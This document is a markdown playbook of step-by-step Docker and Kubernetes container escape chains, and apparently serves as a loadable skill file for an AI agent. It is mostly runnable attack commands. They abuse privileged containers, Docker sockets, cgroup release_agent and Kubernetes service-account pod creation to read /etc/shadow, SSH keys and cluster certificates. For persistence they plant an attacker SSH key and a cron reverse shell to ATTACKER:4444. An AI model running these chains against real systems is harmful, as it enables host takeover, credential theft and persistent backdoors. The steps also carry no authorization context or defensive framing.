# Docker Escape Chains & Kubernetes Escape Paths

> **AI LOAD INSTRUCTION**: Load this for step-by-step container escape chains covering common misconfigurations, Docker-in-Docker scenarios, and Kubernetes-specific escape sequences. Assumes the main [SKILL.md](./SKILL.md) is already loaded for fundamental escape techniques.

---

## 1. ESCAPE CHAIN: PRIVILEGED CONTAINER → HOST ROOT

### 1.1 Full Chain (Mount + Chroot)

```bash
# Step 1: Confirm privileged mode
cat /proc/self/status | grep CapEff
# Expected: 0000003fffffffff (or 000001ffffffffff on newer kernels)

# Step 2: Identify host disk
fdisk -l 2>/dev/null
# /dev/sda1 (typical VM) or /dev/nvme0n1p1 (cloud)

# Step 3: Mount host root
mkdir -p /mnt/hostroot
mount /dev/sda1 /mnt/hostroot

# Step 4: Chroot to host
chroot /mnt/hostroot bash

# Step 5: Persistence — add SSH key
mkdir -p /root/.ssh
echo "ssh-rsa AAAA... attacker@box" >> /root/.ssh/authorized_keys

# Step 6: Clean up (optional — remove chroot artifacts)
exit
umount /mnt/hostroot
```

### 1.2 Full Chain (nsenter — Cleaner)

```bash
# Step 1: Confirm privileged + host PID visibility
ls /proc/1/root/etc/hostname
# If readable → host PID namespace is shared or we're privileged

# Step 2: nsenter into all host namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Step 3: Now running in host context
whoami    # root
hostname  # host hostname
```

---

## 2. ESCAPE CHAIN: DOCKER SOCKET → HOST ROOT

### 2.1 With Docker CLI Available

```bash
# Step 1: Confirm socket access
ls -la /var/run/docker.sock
docker ps    # list running containers

# Step 2: Launch privileged escape container
docker run -d --privileged --pid=host \
  -v /:/hostfs \
  --name escape alpine sleep 3600

# Step 3: Exec into escape container
docker exec -it escape chroot /hostfs bash

# Step 4: Persistence
echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
# Or add cron backdoor:
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /etc/crontab

# Step 5: Cleanup
exit
docker rm -f escape
```

### 2.2 Without Docker CLI (curl Only)

```bash
# Step 1: List images available on host
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json \
  | python3 -c "import sys,json; [print(i['RepoTags']) for i in json.load(sys.stdin)]"

# Step 2: Create container
CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Tty":true,"OpenStdin":true,
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")

# Step 3: Start container
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/${CONTAINER_ID}/start"

# Step 4: Exec command (read host shadow)
EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/${CONTAINER_ID}/exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/host/etc/shadow"],"AttachStdout":true}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")

curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/exec/${EXEC_ID}/start" \
  -H "Content-Type: application/json" \
  -d '{"Tty":true}'

# Step 5: Cleanup
curl -s --unix-socket /var/run/docker.sock \
  -X DELETE "http://localhost/containers/${CONTAINER_ID}?force=true"
```

---

## 3. ESCAPE CHAIN: CGROUP RELEASE_AGENT → HOST COMMAND EXECUTION

```bash
# Step 1: Confirm cgroup v1 + CAP_SYS_ADMIN
mount | grep cgroup
# Look for "cgroup" (not "cgroup2")
grep CapEff /proc/self/status
# Need at minimum CAP_SYS_ADMIN

# Step 2: Find writable cgroup mount
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null | head -n1))
[ -z "$d" ] && echo "No writable cgroup found" && exit 1

# Step 3: Create a child cgroup
mkdir -p "$d/escape"

# Step 4: Enable release notification
echo 1 > "$d/escape/notify_on_release"

# Step 5: Set release_agent to our script on host
host_path=$(sed -n 's/.*\bperdir=\([^,]*\).*/\1/p' /etc/mtab)
# Alternative if perdir not found:
[ -z "$host_path" ] && host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > "$d/release_agent"

# Step 6: Create the command script (executed on HOST)
cat > /cmd << 'EOF'
#!/bin/sh
id > /output
cat /etc/hostname >> /output
cat /etc/shadow >> /output
EOF
chmod +x /cmd

# Step 7: Trigger — add process to cgroup then exit
sh -c "echo \$\$ > $d/escape/cgroup.procs"
sleep 2

# Step 8: Read results
cat /output
```

---

## 4. DOCKER-IN-DOCKER (DinD) ESCAPE

### 4.1 Nested Docker → Host

```bash
# Scenario: running inside a DinD container that has its own Docker daemon
# The inner Docker socket controls the DinD daemon, not the host

# Step 1: Check which Docker we're talking to
docker info 2>/dev/null | grep "Docker Root Dir"
# /var/lib/docker → inner daemon
# Different path → might be host socket

# Step 2: Look for host socket mount
find / -name "docker.sock" 2>/dev/null
# /var/run/docker.sock → could be host's
# /run/docker.sock → inner daemon's

# Step 3: If inner DinD is privileged against the HOST:
# The DinD container itself can see host devices
fdisk -l 2>/dev/null
# If host disk visible → mount it

# Step 4: Escape through the layers
# Inner container → DinD container (via DinD socket) → Host (via privileged mount)
```

### 4.2 DinD with Host Docker Socket Forwarded

```bash
# Common CI/CD pattern: DinD with -v /var/run/docker.sock:/var/run/docker.sock
# This means the DinD container controls the HOST Docker daemon

# Step 1: From inside inner container, if Docker socket is accessible:
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine chroot /host bash

# Step 2: This new container runs on the HOST with full access
```

---

## 5. KUBERNETES-SPECIFIC ESCAPE PATHS

### 5.1 Privileged Pod → Node

```bash
# Step 1: Confirm in Kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /etc/hostname    # pod name format

# Step 2: If pod is privileged
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Now on the Kubernetes node

# Step 3: From node, access kubelet credentials
cat /var/lib/kubelet/config.yaml
ls /etc/kubernetes/pki/    # cluster certificates
```

### 5.2 Service Account → Privileged Pod Creation

```bash
# Step 1: Read current SA token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://kubernetes.default.svc"

# Step 2: Check permissions
curl -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}"

# Step 3: If can create pods → create privileged escape pod
curl -sk "$API/api/v1/namespaces/$NS/pods" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape-pod"},
    "spec": {
      "hostPID": true,
      "hostNetwork": true,
      "containers": [{
        "name": "escape",
        "image": "alpine",
        "command": ["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c \"cat /etc/shadow > /tmp/shadow\"; sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name":"hostfs","mountPath":"/host"}]
      }],
      "volumes": [{"name":"hostfs","hostPath":{"path":"/"}}]
    }
  }'

# Step 4: Exec into escape pod
curl -sk "$API/api/v1/namespaces/$NS/pods/escape-pod/exec?command=/bin/sh&stdin=true&stdout=true&tty=true" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade"
```

### 5.3 hostPath Volume → Node Filesystem

```bash
# If pod has a hostPath volume mounted (even non-privileged):
# Step 1: Check mounts
mount | grep -v "overlay\|tmpfs\|proc\|cgroup"

# Step 2: If /host or similar exists:
ls /host/etc/shadow      # Read node's shadow
cat /host/root/.ssh/id_rsa   # SSH keys

# Step 3: Write to host for persistence
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /host/etc/crontab
```

---

## 6. ESCAPE CHAIN SELECTION MATRIX

| Available Condition | Best Escape Chain | Section |
|---|---|---|
| `--privileged` flag | Mount host disk + chroot | §1.1 |
| `--privileged` + hostPID | nsenter -t 1 | §1.2 |
| Docker socket mounted | Create privileged container | §2 |
| CAP_SYS_ADMIN + cgroup v1 | release_agent write | §3 |
| CAP_SYS_PTRACE + hostPID | Process injection | SKILL.md §3.2 |
| CAP_DAC_READ_SEARCH | Shocker (open_by_handle_at) | SKILL.md §3.4 |
| K8s SA with pod/create RBAC | Create privileged pod | §5.2 |
| K8s hostPath volume | Read/write node filesystem | §5.3 |
| Vulnerable kernel | Kernel exploit | linux-privilege-escalation |
| Vulnerable runc (<1.0.0-rc6) | CVE-2019-5736 | SKILL.md §8 |
| DinD with host socket | Double-hop escape | §4.2 |
